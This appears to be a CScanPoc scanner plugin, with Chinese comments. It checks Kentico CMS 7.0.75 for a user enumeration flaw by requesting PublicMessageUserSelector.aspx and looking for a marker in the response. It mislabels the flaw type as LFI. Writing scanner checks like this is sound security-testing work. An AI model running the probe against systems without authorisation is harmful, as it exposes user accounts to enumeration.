# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'KenticoCMS_0001'  # 平台漏洞编号，留空
    name = 'Kentico CMS suffers from a user enumeration vulnerability.'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-10-31'  # 漏洞公布时间
    desc = '''
        Kentico CMS version 7.0.75 suffers from a user enumeration vulnerability.
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/125632/Kentico-CMS-7.0.75-User-Enumeration.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KenticoCMS'  # 漏洞应用名称
    product_version = '7.0.75'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ade2e1a7-6676-4712-af6d-75c6621e7b92'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx"
            r = requests.get(self.target + payload)

            if r.status_code == 200 and '<td style="white-space:nowrap;">' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
